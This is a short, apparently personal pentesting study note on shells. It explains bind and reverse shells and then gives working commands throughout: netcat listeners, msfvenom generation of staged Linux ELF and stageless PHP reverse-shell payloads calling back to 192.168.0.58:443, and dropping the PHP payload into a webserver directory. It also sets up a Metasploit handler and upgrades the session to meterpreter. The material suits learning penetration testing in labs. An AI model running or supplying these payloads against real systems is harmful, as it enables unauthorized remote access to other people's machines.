#SHELLSSSSSS- RCM 8/20/21
Used to interact with underlying programming + issue system commands.
Resource:
https://rosettacode.org/wiki/Execute_a_system_command

Webshells available online as well. Be careful. Verify source, and the functions the shell calls. 

Bind shells open up a port on the target and wait for the connection.
Reverse shells connect directly to the attacker. 
 - reverse shells are more common for pentesting.

Resource:
pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

**Be sure netcat listener is running in order to recieve a connection**
`nc -klvp 53`
#May copy and paste reverse shells in /var/www/html 

#If not limited by length of the command line & have the ability to upload shells.

Use msfvenom to create a payload!

`msfvenom --list payloads | grep x64 | grep linux | grep reverse`

* Staged payloads don't contain the logic to create a full reverse shell.
`msfvenom -p linux/x64/shell/reverse_tcp lhost=192.168.0.58 lport=443 -f elf -o r443`
chmod +x 443
* Need to create metasploit listener along with the staged payload connection. Metasploit contains the proper logic that will send the rest of the payload to the connector. 
* In metasploit
`msf5 > use exploit/multi/handler` 
`msf5 exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp`
`set lhost 0.0.0.0`
`set lport 443`
`run`
--> stage is sent.

* Stageless payload - standalone program that doesn't need anything additional (like the metasploit listener) 
  - Advantage: Just need netcat listener.
  - Disadvantage: It may be a lot bigger.
* Generate stageless php payload:
`msfvenom --list payloads | grep php | grep reverse`
`msfvenom -p php/reverse_php lhost=192.168.0.58 lport=443 -o r443.php` (Creates stageless payload)
* Use netcat to intercept the incoming connection
`mv r443.php /var/www/html/` (Puts this payload on a webserver)
`nc -lvp 443` (netcat listener)
* Visit the webserver page
* Create metasploit listener for previously created shell
`msf5 > use exploit/multi/handler`
`msf5 exploit(multi/handler) > set payload php/reverse_php`
`set lhost <lhost IP>`
`set lport 443`
`run`
* background the session with ctrl+Z -- upgrade shell to meterpreter
`use post/multi/manage/shell_to_meterpreter` > options > set lport 8443 > set lhost <lhost IP> 
`sessions -l`
`set session 1`
`run`
